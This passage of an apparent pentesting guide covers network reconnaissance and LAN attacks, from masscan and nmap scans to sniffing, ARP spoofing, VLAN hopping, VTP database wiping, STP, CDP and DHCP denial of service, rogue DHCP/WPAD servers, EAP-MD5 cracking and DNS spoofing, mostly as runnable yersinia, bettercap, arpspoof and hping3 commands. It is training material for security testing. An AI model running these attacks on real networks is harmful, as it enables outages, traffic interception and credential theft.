open or not, that will take too much time.\nThen, what you need is a\nfast port scanner\n(\nmasscan\n) and a list of the\nports more used:\n#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)\nmasscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080\n199.66\n.11.0/24\nYou could also perform this step with\nnmap\n, but it slower and somewhat\nnmap\nhas problems identifying hosts up.\nHTTP Port Discovery\nThis is just a TCP port discovery useful when you want to\nfocus on discovering HTTP\nservices\n:\nmasscan -p80,443,8000-8100,8443\n199.66\n.11.0/24\nUDP Port Discovery\nYou could also try to check for some\nUDP port open\nto decide if you should\npay more attention\nto a\nhost.\nAs UDP services usually\ndon't respond\nwith\nany data\nto a regular empty UDP probe packet it is difficult to say if a port is being filtered or open. The easiest way to decide this is to send a packet related to the running service, and as you don't know which service is running, you should try the most probable based on the port number:\nnmap\n-sU\n-sV\n--version-intensity\n0\n-F\n-n\n199.66\n.11.53/24\n# The -sV will make nmap test each possible known UDP service packet\n# The \"--version-intensity 0\" will make nmap only test the most probable\nThe nmap line proposed before will test the\ntop 1000 UDP ports\nin every host inside the\n/24\nrange but even only this will take\n>20min\n. If need\nfastest results\nyou can use\nudp-proto-scanner\n:\n./udp-proto-scanner.pl 199.66.11.53/24\nThis will send these\nUDP probes\nto their\nexpected port\n(for a /24 range this will just take 1 min):\nDNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp.\nSCTP Port Discovery\n#Probably useless, but it's pretty fast, why not trying?\nnmap\n-T4\n-sY\n-n\n--open\n-Pn\n<\nIP/range\n>\nPentesting Wifi\nHere you can find a nice guide of all the well known Wifi attacks at the time of the writing:\nPentesting Wifi\nDiscovering hosts from the inside\nIf you are inside the network one of the first things you will want to do is to\ndiscover other hosts\n. Depending on\nhow much noise\nyou can/want to do, different actions could be performed:\nPassive\nYou can use these tools to passively discover hosts inside a connected network:\nnetdiscover\n-p\np0f\n-i\neth0\n-p\n-o\n/tmp/p0f.log\n# Bettercap\nnet.recon on/off\n#Read local ARP cache periodically\nnet.show\nset\nnet.show.meta\ntrue\n#more info\nActive\nNote that the techniques commented in\nDiscovering hosts from the outside\n(\nTCP/HTTP/UDP/SCTP Port Discovery\n) can be also\napplied here\n.\nBut, as you are in the\nsame network\nas the other hosts, you can do\nmore things\n:\n#ARP discovery\nnmap\n-sn\n<\nNetwork\n>\n#ARP Requests (Discover IPs)\nnetdiscover\n-r\n<\nNetwork\n>\n#ARP requests (Discover IPs)\n‚Äã\n#NBT discovery\nnbtscan\n-r\n192.168\n.0.1/24\n#Search in Domain\n‚Äã\n# Bettercap\nnet.probe on/off\n#Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD\nset\nnet.probe.mdns true/false\n#Enable mDNS discovery probes (default=true)\nset\nnet.probe.nbns true/false\n#Enable NetBIOS name service discovery probes (default=true)\nset\nnet.probe.upnp true/false\n#Enable UPNP discovery probes (default=true)\nset\nnet.probe.wsd true/false\n#Enable WSD discovery probes (default=true)\nset\nnet.probe.throttle\n10\n#10ms between probes sent (default=10)\n‚Äã\n#IPv6\nalive6\n<\nIFACE\n>\n# Send a pingv6 to multicast.\nActive ICMP\nNote that the techniques commented in\nDiscovering hosts from the outside\n(\nICMP\n) can be also\napplied here\n.\nBut, as you are in the\nsame network\nas the other hosts, you can do\nmore things\n:\nIf you\nping\na\nsubnet broadcast address\nthe ping should be arrive to\neach host\nand they could\nrespond\nto\nyou\n:\nping -b 10.10.5.255\nPinging the\nnetwork broadcast address\nyou could even find hosts inside\nother subnets\n:\nping -b 255.255.255.255\nUse the\n-PE\n,\n-PP\n,\n-PM\nflags of\nnmap\nto perform host discovery sending respectively\nICMPv4 echo\n,\ntimestamp\n, and\nsubnet mask requests:\nnmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24\nWake On Lan\nWake On Lan is used to\nturn on\ncomputers through a\nnetwork message\n. The magic packet used to turn on the computer is only a packet where a\nMAC Dst\nis provided and then it is\nrepeated 16 times\ninside the same paket.\nThen this kind of packets are usually sent in an\nethernet 0x0842\nor in a\nUDP packet to port 9\n.\nIf\nno [MAC]\nis provided, the packet is sent to\nbroadcast ethernet\n(and the broadcast MAC will be the one being repeated).\n# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)\nwol.eth\n[\nMAC\n]\n#Send a WOL as a raw ethernet packet of type 0x0847\nwol.udp\n[\nMAC\n]\n#Send a WOL as an IPv4 broadcast packet to UDP port 9\nScanning Hosts\nOnce you have discovered all the IPs (external or internal) you want to scan in depth, different actions can be performed.\nTCP\nOpen\nport:\nSYN --> SYN/ACK --> RST\nClosed\nport:\nSYN --> RST/ACK\nFiltered\nport:\nSYN --> [NO RESPONSE]\nFiltered\nport:\nSYN --> ICMP message\n# Nmap fast scan for the most 1000tcp ports used\nnmap\n-sV\n-sC\n-O\n-T4\n-n\n-Pn\n-oA\nfastscan\n<\nIP\n>\n# Nmap fast scan for all the ports\nnmap\n-sV\n-sC\n-O\n-T4\n-n\n-Pn\n-p-\n-oA\nfullfastscan\n<\nIP\n>\n# Nmap fast scan for all the ports slower to avoid failures due to -T4\nnmap\n-sV\n-sC\n-O\n-p-\n-n\n-Pn\n-oA\nfullscan\n<\nIP\n>\n‚Äã\n#Bettercap Scan\nsyn.scan\n192.168\n.1.0/24\n1\n10000\n#Ports 1-10000\nUDP\nThere are 2 options to scan an UDP port:\nSend a\nUDP packet\nand check for the response\nICMP unreachable\nif the port is\nclosed\n(in several cases ICMP will be\nfiltered\nso you won't receive any information inf the port is close or open).\nSend a\nformatted datagrams\nto elicit a response from a\nservice\n(e.g., DNS, DHCP, TFTP, and others, as listed in\nnmap-payloads\n). If you receive a\nresponse\n, then, the port is\nopen\n.\nNmap\nwill\nmix both\noptions using \"-sV\" (UDP scans are very slow), but notice that UDP scans are slower than TCP scans:\n# Check if any of the most common udp services is running\nudp-proto-scanner.pl\n<\nIP\n>\n# Nmap fast check if any of the 100 most common UDP services is running\nnmap\n-sU\n-sV\n--version-intensity\n0\n-n\n-F\n-T4\n<\nIP\n>\n# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts\nnmap\n-sU\n-sV\n-sC\n-n\n-F\n-T4\n<\nIP\n>\n# Nmap \"fast\" top 1000 UDP ports\nnmap\n-sU\n-sV\n--version-intensity\n0\n-n\n-T4\n<\nIP\n>\n# You could use nmap to test all the UDP ports, but that will take a lot of time\nSCTP Scan\nSCTP sits alongside TCP and UDP. Intended to provide\ntransport\nof\ntelephony\ndata over\nIP\n, the protocol duplicates many of the reliability features of Signaling System 7 (SS7), and underpins a larger protocol family known as SIGTRAN. SCTP is supported by operating systems including IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS, and VxWorks.\nTwo different scans for SCTP are offered by nmap:\n-sY\nand\n-sZ\n# Nmap fast SCTP scan\nnmap\n-T4\n-sY\n-n\n-oA\nSCTFastScan\n<\nIP\n>\n# Nmap all SCTP scan\nnmap\n-T4\n-p-\n-sY\n-sV\n-sC\n-F\n-n\n-oA\nSCTAllScan\n<\nIP\n>\nIDS and IPS evasion\nIDS and IPS Evasion\nMore nmap options\nNmap Summary (ESP)\nRevealing Internal IP Addresses\nMisconfigured routers, firewalls, and network devices sometimes\nrespond\nto network probes\nusing nonpublic source addresses\n. You can use\ntcpdump\nused to\nidentify packets\nreceived from\nprivate addresses\nduring testing. In this case, the\neth2\ninterface in Kali Linux is\naddressable\nfrom the\npublic Internet\n(If you are\nbehind\na\nNAT\nof a\nFirewall\nthis kind of packets are probably going to be\nfiltered\n).\ntcpdump ‚Äìnt\n-i\neth2 src net\n10\nor\n172.16\n/12 or\n192.168\n/16\ntcpdump: verbose output suppressed, use\n-v\nor\n-vv\nfor\nfull protocol decode\nlistening on eth2, link-type EN10MB\n(\nEthernet\n)\n, capture size\n65535\nbytes\nIP\n10.10\n.0.1\n>\n185.22\n.224.18: ICMP\necho\nreply,\nid\n25804\n,\nseq\n1582\n, length\n64\nIP\n10.10\n.0.2\n>\n185.22\n.224.18: ICMP\necho\nreply,\nid\n25804\n,\nseq\n1586\n, length\n64\nSniffing\nSniffing you can learn details of IP ranges, subnet sizes, MAC addresses, and hostnames by reviewing captured frames and packets. If the network is misconfigured or switching fabric under stress, attackers can capture sensitive material via passive network sniffing.\nIf a switched Ethernet network is configured properly, you will only see broadcast frames and material destined for your MAC address.\nTCPDump\nsudo\ntcpdump\n-i\n<\nINTERFACE\n>\nudp port\n53\n#Listen to DNS request to discover what is searching the host\ntcpdump\n-i\n<\nIFACE\n>\nicmp\n#Listen to icmp packets\nsudo\nbash\n-c\n\"sudo nohup tcpdump -i eth0 -G 300 -w\n\\\"\n/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\n\\\"\n-W 50 'tcp and (port 80 or port 443)' &\"\nOne can, also, capture packets from a remote machine over an SSH session with Wireshark as the GUI in realtime.\nssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -\nssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic\nBettercap\nnet.sniff on\nnet.sniff stats\nset\nnet.sniff.output sniffed.pcap\n#Write captured packets to file\nset\nnet.sniff.local\n#If true it will consider packets from/to this computer, otherwise it will skip them (default=false)\nset\nnet.sniff.filter\n#BPF filter for the sniffer (default=not arp)\nset\nnet.sniff.regexp\n#If set only packets matching this regex will be considered\nWireshark\nObviously.\nCapturing credentials\nYou can use tools like\nhttps://github.com/lgandx/PCredz\nto parse credentials from a pcap or a live interface.\nLAN attacks\nARP spoofing\nARP Spoofing consist on sending gratuitous ARPResponses to indicate that the IP of a machine has the MAC of our device. Then, the victim will change the ARP table and will contact our machine every time it wants to contact the IP spoofed.\nBettercap\narp.spoof on\nset\narp.spoof.targets\n<\nIP\n>\n#Specific targets to ARP spoof (default=<entire subnet>)\nset\narp.spoof.whitelist\n#Specific targets to skip while spoofing\nset\narp.spoof.fullduplex\ntrue\n#If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)\nset\narp.spoof.internal\ntrue\n#If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)\nArpspoof\necho\n1\n>\n/proc/sys/net/ipv4/ip_forward\narpspoof\n-t\n192.168\n.1.1\n192.168\n.1.2\narpspoof\n-t\n192.168\n.1.2\n192.168\n.1.1\nMAC Flooding - CAM overflow\nOverflow the switch‚Äôs CAM table sending a lot of packets with different source mac address. When the CAM table is full the switch start behaving like a hub (broadcasting all the traffic).\nmacof\n-i\n<\ninterface\n>\nIn modern switches this vulnerability has been fixed.\n802.1Q VLAN / DTP Attacks\nDynamic Trunking\nDTP (Dynamic Trunking Protocol)\nis a link layer protocol designed to provide an automatic trunking system. With DTP, switches decide which port will work in trunk mode (Trunk) and which will not. The use of\nDTP\nindicates\npoor network design.\nTrunks should be strictly\nwhere they are needed, and it should be documented.\nBy default, all switch ports operate in Dynamic Auto mode.\nThis indicates that the switch port is in trunk initiation mode from the neighbouring switch.\nThe Pentester needs to physically connect to the switch and send a DTP Desirable frame\n, which triggers the port to switch to trunk mode. The attacker can then enumerate VLANs using STP frame analysis and bypass VLAN segmentation by creating virtual interfaces.\nMany switches support the Dynamic Trunking Protocol (DTP) by default, however, which an adversary can abuse to\nemulate a switch and receive traffic across all VLANs\n. The tool\ndtpscan.sh\ncan sniff an interface and\nreports if switch is in Default mode, trunk, dynamic, auto or access mode\n(this is the only one that would avoid VLAN hopping). The tool will indicate if the switch is vulnerable or not.\nIf it was discovered that the the network is vulnerable, you can use\nYersinia\nto launch an \"\nenable trunking\n\" using protocol \"\nDTP\n\" and you will be able to see network packets from all the VLANs.\napt-get\ninstall\nyersinia\n#Installation\nsudo\napt\ninstall\nkali-linux-large\n#Another way to install it in Kali\nyersinia\n-I\n#Interactive mode\n#In interactive mode you will need to select a interface first\n#Then, you can select the protocol to attack using letter \"g\"\n#Finally, you can select the attack using letter \"x\"\n‚Äã\nyersinia\n-G\n#For graphic mode\nTo enumerate the VLANs it's also possible to generate the DTP Desirable frame with the script\nDTPHijacking.py\n. D\no not interrupt the script under any circumstances. It injects DTP Desirable every three seconds.\nThe dynamically created trunk channels on the switch only live for five minutes. After five minutes, the trunk falls off.\nsudo python3 DTPHijacking.py --interface eth0\nI would like to point out that\nAccess/Desirable (0x03)\nindicates that the DTP frame is of the Desirable type, which tells the port to switch to Trunk mode. And\n802.1Q/802.1Q (0xa5\n) indicates the\n802.1Q\nencapsulation type.\nBy analyzing the STP frames,\nwe learn about the existence of VLAN 30 and VLAN 60.\nAttacking specific VLANs\nOnce you known VLAN IDs and IPs values, you can\nconfigure a virtual interface to attack a specific VLAN\n.\nIf DHCP is not available, then use\nifconfig\nto set a static IP address.\nroot@kali:~# modprobe 8021q\nroot@kali:~# vconfig add eth1 250\nAdded VLAN with VID == 250 to IF -:eth1:-\nroot@kali:~# dhclient eth1.250\nReloading /etc/samba/smb.conf: smbd only.\nroot@kali:~# ifconfig eth1.250\neth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65\ninet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0\ninet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:19 errors:0 dropped:0 overruns:0 frame:0\nTX packets:13 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:0\nRX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)\n‚Äã\nroot@kali:~# arp-scan -I eth1.250 10.121.5.0/24\n# Another configuration example\nmodprobe 8021q\nvconfig\nadd\neth1\n20\nifconfig\neth1.20\n192.168\n.1.2 netmask\n255.255\n.255.0 up\n# Another configuration example\nsudo\nvconfig\nadd\neth0\n30\nsudo\nip\nlink\nset\neth0.30 up\nsudo\ndhclient\n-v\neth0.30\nAutomatic VLAN Hopper\nThe discussed attack of\nDynamic Trunking and creating virtual interfaces an discovering hosts inside\nother VLANs are\nautomatically performed\nby the tool:\nhttps://github.com/nccgroup/vlan-hopping---frogger\n‚Äã\nDouble Tagging\nIf an attacker knows the value of the\nMAC, IP and VLAN ID of the victim host\n, he could try to\ndouble tag a frame\nwith its designated VLAN and the VLAN of the victim and send a packet. As the\nvictim won't be able to connect back\nwith the attacker, so the\nbest option for the attacker is communicate via UDP\nto protocols that can perform some interesting actions (like SNMP).\nAnother option for the attacker is to launch a\nTCP port scan spoofing an IP controlled by the attacker and accessible by the victim\n(probably through internet). Then, the attacker could sniff in the second host owned by him if it receives some packets from the victim.\nTo perform this attack you could use scapy:\npip install scapy\nfrom\nscapy\n.\nall\nimport\n*\n# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)\npacket\n=\nEther\n()\n/\nDot1Q\n(\nvlan\n=\n1\n)\n/\nDot1Q\n(\nvlan\n=\n20\n)\n/\nIP\n(\ndst\n=\n'192.168.1.10'\n)\n/\nICMP\n()\nsendp\n(\npacket\n)\nLateral VLAN Segmentation Bypass\nIf you have\naccess to a switch that you are directly connected to\n, you have the ability to\nbypass VLAN segmentation\nwithin the network. Simply\nswitch the port to trunk mode\n(otherwise known as trunk), create virtual interfaces with the IDs of the target VLANs, and configure an IP address. You can try requesting the address dynamically (DHCP) or you can configure it statically. It depends on the case.\nLateral VLAN Segmentation Bypass\nLayer 3 Private VLAN Bypass\nIn guest wireless networks and other environments, private VLAN (also known as\nport isolation\n) settings are used to\nprevent peers from interacting\n(i.e., clients\nconnect to a wireless access point but cannot address one another\n). Depending on network ACLs (or lack thereof), it might be possible to send IP packets up to a router, which are then forwarded back to a neighbouring peer.\nThis attack will send a\nspecially crafted packet to the IP of a client but with the MAC of the router\n. Then, the\nrouter will redirect the packet to the client\n. As in\nDouble Tagging Attacks\nyou can exploit this vulnerability by controlling a host accessible by the victim.\nVTP Attacks\nVTP (VLAN Trunking Protocol)\nis a protocol designed to centrally manage VLANs. To keep track of the current VLAN database, switches check special revision numbers. When any table update occurs, the revision number is incremented by one. And if a switch detects a configuration with a higher revision number, it will automatically update its VLAN database.\nRoles in a VTP domain\nVTP Server.\nA switch in the VTP Server role can create new VLANs, delete old ones, or change information in the VLANs themselves.\nIt also generates VTP announcements for the rest of the domain members.\nVTP Client.\nA switch in this role will receive specific VTP announcements from other switches in the domain to update the VLAN databases on its own. Clients are limited in their ability to create VLANs and are not even allowed to change the VLAN configuration locally. In other words,\nread only access.\nVTP Transparent.\nIn this mode, the switch does not participate in VTP processes and can host full and local administration of the entire VLAN configuration. When operating in transparent mode, switches only transmit VTP announcements from other switches without affecting their VLAN configuration.\nSuch switches will always have a revision number of zero and cannot be attacked.\nAdvertisement types\nSummary Advertisement ‚Äî\nthe VTP announcement that the VTP server sends every\n300 seconds (5 minutes).\nThis announcement stores the VTP domain name, protocol version, timestamp, and MD5 configuration hash value.\nSubset Advertisement ‚Äî\nthis is the VTP advertisement that is sent whenever a VLAN configuration change occurs.\nAdvertisement Request ‚Äî\nis a request from the VTP client to the VTP server for a Summary Advertisement message. Usually sent in response to a message that a switch has detected a Summary Advertisement with a higher configuration revision number.\nVTP can\nonly be attacked from a trunk port,\nbecause\nVTP announcements are only broadcast and received on trunk ports.\nTherefore, when pentesting after attacking DTP, your next target could be VTP.\nTo attack the VTP domain you can\nuse Yersinia\nto\nrun a VTP inject that will erase the entire VLAN\ndatabase\nand thus paralyze the network.\nThe VTP protocol has as many as\nthree versions\n. In this post the attack is against the first version, VTPv1\nyersinia\n-G\n#For graphic mode\nTo erase the entire VLAN database, select the\ndeleting all VTP vlans\noption\nSTP Attacks\nIf you cannot capture BPDU frames on your interfaces, it is unlikely that you will succeed in an STP attack.\nSTP BPDU DoS\nSending a lot of BPDUs TCP (Topology Change Notification) or Conf (the BPDUs that are sent when the topology is created) the switches are overloaded and stop working correctly.\nyersinia stp\n-attack\n2\nyersinia stp\n-attack\n3\n#Use -M to disable MAC spoofing\nSTP TCP Attack\nWhen a TCP is sent, the CAM table of the switches will be deleted in 15s. Then, if you are sending continuously this kind of packets, the CAM table will be restarted continuously (or every 15segs) and when it is restarted, the switch behaves as a hub\nyersinia stp\n-attack\n1\n#Will send 1 TCP packet and the switch should restore the CAM in 15 seconds\nyersinia stp\n-attack\n0\n#Will send 1 CONF packet, nothing else will happen\nSTP Root Attack\nThe attacker simulates the behaviour of a switch to become the STP root of the network. Then, more data will pass through him. This is interesting when you are connected to two different switches.\nThis is done by sending BPDUs CONF packets saying that the\npriority\nvalue is less than the actual priority of the actual root switch.\nyersinia stp\n-attack\n4\n#Behaves like the root switch\nyersinia stp\n-attack\n5\n#This will make the device behaves as a switch but will not be root\nIf the attacker is connected to 2 switches he can be the root of the new tree and all the traffic between those switches will pass through him\n(a MITM attack will be performed).\nyersinia stp\n-attack\n6\n#This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets \"Sniff\" --> \"Bridged sniffing\"\nettercap\n-T\n-i\neth1\n-B\neth2\n-q\n#Set a bridge between 2 interfaces to forwardpackages\nCDP Attacks\nCISCO Discovery Protocol is the protocol used by CISCO devices to talk among them,\ndiscover who is alive\nand what features does they have.\nInformation Gathering\nBy default, the CDP sends announcements to all its ports.\nBut what if an intruder connects to a port on the same switch? Using a network sniffer, be it\nWireshark,\ntcpdump\nor\nYersinia\n, he could extract\nvaluable information about the device itself\n, from its model to the Cisco IOS version. Using this information he will be able to enumerate the same version of Cisco IOS and find the vulnerability and then exploit it.\nCDP Flooding Attack\nYou can make a DoS attack to a CISCO switch by exhausting the device memory simulating real CISCO devices.\nsudo\nyersinia cdp\n-attack\n1\n#DoS Attack simulating new CISCO devices\n# Or you could use the GUI\nsudo\nyersinia\n-G\nSelect the\nflooding CDP table\noption and start the attack. The switch CPU will be overloaded, as well as the CDP neighbor table,\nresulting in ‚Äúnetwork paralysis‚Äù.\nCDP Impersonation Attack\nsudo\nyersinia cdp\n-attack\n2\n#Simulate a new CISCO device\nsudo\nyersinia cdp\n-attack\n0\n#Send a CDP packet\nYou could also use\nscapy\n. Be sure to install it with\nscapy/contrib\npackage.\nVoIP Attacks\nAlthough intended for use by the employees‚Äô Voice over Internet Protocol (VoIP) phones, modern VoIP devices are increasingly integrated with IoT devices. Many employees can now unlock doors using a special phone number, control the room‚Äôs thermostat...\nThe tool\nvoiphopper\nmimics the behavior of a VoIP phone in Cisco, Avaya, Nortel, and Alcatel-Lucent environments. It automatically discovers the correct VLAN ID for the voice network using one of the device discovery protocols it supports, such as the Cisco Discovery Protocol (CDP), the Dynamic Host Configuration Protocol (DHCP), Link Layer Discovery Protocol Media Endpoint Discovery (LLDP-MED), and 802.1Q ARP.\nVoIP Hopper\nsupports\nthree\nCDP modes. The\nsniff\nmode inspects the network packets and attempts to locate the VLAN ID. To use it, set the\n-c\nparameter to\n0\n. The\nspoof\nmode generates custom packets similar to the ones a real VoIP device would transmit in the corporate network. To use it, set the\n-c\nparameter to\n1\n. The spoof with a\npre-madepacket\nmode sends the same packets as a Cisco 7971G-GE IP phone. To use it, set the\n-c\nparameter to\n2\n.\nWe use the last method because it‚Äôs the fastest approach. The\n-i\nparameter specifies the attacker‚Äôs\nnetwork\ninterface\n, and the\n-E\nparameter specifies the\nname of the VOIP device\nbeing imitated. We chose the name SEP001EEEEEEEEE, which is compatible with the Cisco naming format for VoIP phones. The format consists of the word ‚ÄúSEP‚Äù followed by a MAC address. In corporate environments, you can imitate an existing VoIP device by looking at the MAC label on the back of the phone; by pressing the Settings button and selecting the Model Information option on the phone‚Äôs display screen; or by attaching the VoIP device‚Äôs Ethernet cable to your laptop and observing the device‚Äôs CDP requests using Wireshark.\nvoiphopper\n-i\neth1\n-E\n'SEP001EEEEEEEEE '\n-c\n2\nIf the tool executes successfully, the\nVLAN network will assign an IPv4 address to the attacker‚Äôs device\n.\nDHCP Attacks\nEnumeration\nnmap\n--script\nbroadcast-dhcp-discover\nStarting Nmap\n7.80\n(\nhttps://nmap.org\n)\nat\n2019\n-10-16 05:30 EDT\nWARNING: No targets were specified, so\n0\nhosts scanned.\nPre-scan script results:\n|\nbroadcast-dhcp-discover:\n|\nResponse\n1\nof\n1\n:\n|\nIP Offered:\n192.168\n.1.250\n|\nDHCP Message Type: DHCPOFFER\n|\nServer Identifier:\n192.168\n.1.1\n|\nIP Address Lease Time: 1m00s\n|\nSubnet Mask:\n255.255\n.255.0\n|\nRouter:\n192.168\n.1.1\n|\nDomain Name Server:\n192.168\n.1.1\n|\n_    Domain Name: mynet\nNmap done:\n0\nIP addresses\n(\n0\nhosts up\n)\nscanned\nin\n5.27\nseconds\nDoS\nTwo types of DoS\ncould be performed against DHCP servers. The first one consists on\nsimulate enough fake hosts to use all the possible IP addresses\n.\nThis attack will work only if you can see the responses of the DHCP server and complete the protocol (\nDiscover\n(Comp) -->\nOffer\n(server) -->\nRequest\n(Comp) -->\nACK\n(server)). For example, this is\nnot possible in Wifi networks\n.\nAnother way to perform a DHCP DoS is to send a\nDHCP-RELEASE packet using as source code every possible IP\n. Then, the server will think that everybody has finished using the IP.\nyersinia dhcp\n-attack\n1\nyersinia dhcp\n-attack\n3\n#More parameters are needed\nA more automatic way of doing this is using the tool\nDHCPing\n‚Äã\nYou could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect,\nyou can server malicious values mentioned in the next attack\n.\nSet malicious values\nYou can use Responder DHCP script (\n/usr/share/responder/DHCP.py\n) to establish a rogue DHCP server. Setting a malicious gateway is not ideal, because the hijacked connection is only half-duplex (i.e., we capture egress packets from the client, but not the responses from the legitimate gateway). As such, I would recommend setting a rogue DNS or WPAD server to capture HTTP traffic and credentials in particular.\nDescription\nExample\nOur IP address, advertised as a gateway\n-i 10.0.0.100\nThe local DNS domain name (optional)\n-d example.org\nIP address of the original router/gateway\n-r 10.0.0.1\nPrimary DNS server IP address\n-p 10.0.0.100\nSecondary DNS server IP address (optional)\n-s 10.0.0.1\nThe netmask of the local network\n-n 255.255.255.0\nThe interface to listen for DHCP traffic on\n-I eth1\nWPAD configuration address (URL)\n-w ‚Äú\nhttp://10.0.0.100/wpad.dat\\n‚Äù\n‚Äã\nSpoof the default gateway IP address\n-S\nRespond to all DHCP requests (very noisy)\n-R\nEAP Attacks\nHere are some of the attack tactics that can be used against 802.1X implementations:\nActive brute-force password grinding via EAP\nAttacking the RADIUS server with malformed EAP content\n**\n(exploits)\nEAP message capture and offline password cracking (EAP-MD5 and PEAP)\nForcing EAP-MD5 authentication to bypass TLS certificate validation\nInjecting malicious network traffic upon authenticating using a hub or similar\nIf the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:\neapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt\nFHRP (GLBP & HSRP) Attacks\nFHRP\n(First Hop Redundancy Protocol) is a class of network protocols designed to\ncreate a hot redundant routing system\n. With FHRP, physical routers can be combined into a single logical device, which increases fault tolerance and helps distribute the load.\nCisco Systems engineers have developed two FHRP protocols, GLBP and HSRP.\nGLBP & HSRP Attacks\nRIP\nThree versions of the Routing Information Protocol (RIP) exist‚ÄîRIP, RIPv2, and RIPng. RIP and RIPv2 use UDP datagrams sent to peers via port 520, whereas RIPng broadcasts datagrams to UDP port 521 via IPv6 multicast. RIPv2 introduced MD5 authentication support. RIPng does not incorporate native authentication; rather, it relies on optional IPsec AH and ESP headers within IPv6.\nFor more information about how to attack this protocol go to the book\nNetwork Security Assessment: Know Your Network (3rd edition).\nEIGRP Attacks\nEIGRP (Enhanced Interior Gateway Routing Protocol)\nis a dynamic routing protocol.\nIt is a distance-vector protocol.\nIf there is\nno authentication\nand configuration of passive interfaces, an\nintruder\ncan interfere with EIGRP routing and cause\nrouting tables poisoning\n. Moreover, EIGRP network (in other words, autonomous system)\nis flat and has no segmentation into any zones\n. If an\nattacker injects a route\n, it is likely that this route will\nspread\nthroughout the autonomous EIGRP system.\nTo attack a EIGRP system requires\nestablishing a neighbourhood with a legitimate EIGRP route\nr, which opens up a lot of possibilities, from basic reconnaissance to various injections.\n****\nFRRouting\nallows you to implement\na virtual router that supports BGP, OSPF, EIGRP, RIP and other protocols.\nAll you need to do is deploy it on your attacker‚Äôs system and you can actually pretend to be a legitimate router in the routing domain.\nEIGRP Attacks\n****\nColy\nalso supports capture of EIGRP broadcasts and injection of packets to manipulate routing configuration. For more info about how to attack it with Coly check\nNetwork Security Assessment: Know Your Network (3rd edition).\nOSPF\nMost Open Shortest Path First (OSPF) implementations use MD5 to provide authentication between routers. Loki and John the Ripper can capture and attack MD5 hashes to reveal the key, which can then be used to advertise new routes. The route parameters are set by using the\nInjection\ntab, and the key set under\nConnection\n.\nFor more information about how to attack this protocol go to the book\nNetwork Security Assessment: Know Your Network (3rd edition).\nOther Generic Tools & Sources\n‚Äã\nAbove\n: Tool to scan network traffic and find vulnerabilities\nYou can find some more information about network attacks\nhere\n.\n(TODO: Read it all and all new attacks if any)\nSpoofing\nThe attacker configures all the network parameters (GW, IP, DNS) of the new member of the network sending fake DHCP responses.\nEttercap\nyersinia dhcp\n-attack\n2\n#More parameters are needed\nARP Spoofing\nCheck the\nprevious section\n.\nICMPRedirect\nICMP Redirect consist on sending an ICMP packet type 1 code 5 that indicates that the attacker is the best way to reach an IP. Then, when the victim wants to contact the IP, it will send the packet through the attacker.\nEttercap\nicmp_redirect\nhping3\n[\nVICTIM IP ADDRESS\n]\n-C\n5\n-K\n1\n-a\n[\nVICTIM DEFAULT GW IP ADDRESS\n]\n--icmp-gw\n[\nATTACKER IP ADDRESS\n]\n--icmp-ipdst\n[\nDST IP ADDRESS\n]\n--icmp-ipsrc\n[\nVICTIM IP ADDRESS\n]\n#Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]\nDNS Spoofing\nThe attacker will resolve some (or all) the domains that the victim ask for.\nset\ndns.spoof.hosts ./dns.spoof.hosts\n;\ndns.spoof on\nConfigure own DNS with dnsmasq\napt-get\ninstall\ndnsmasqecho\n\"addn-hosts=dnsmasq.hosts\"\n>\ndnsmasq.conf\n#Create dnsmasq.confecho \"127.0.0.1   domain.example.com\" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon\ndig\n@localhost domain.example.com\n# Test the configured DNS\nLocal Gateways\nMultiple routes to systems and networks often exist. Upon building a list of MAC addresses within the local network, use\ngateway-finder.py\nto identify hosts that support IPv4 forwarding.\nroot@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git\nroot@kali:~# cd gateway-finder/\nroot@kali:~# arp-scan -l | tee hosts.txt\nInterface: eth0, datalink type: EN10MB (Ethernet)\nStarting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)\n10.0.0.100     00:13:72:09:ad:76       Dell Inc.\n10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION\n10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.\n‚Äã\nroot@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99\ngateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder\n[+] Using interface eth0 (-I to change)\n[+] Found 3 MAC addresses in hosts.txt\n[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]\n[+] We can reach TCP port 80 on 209.85.227.99 via 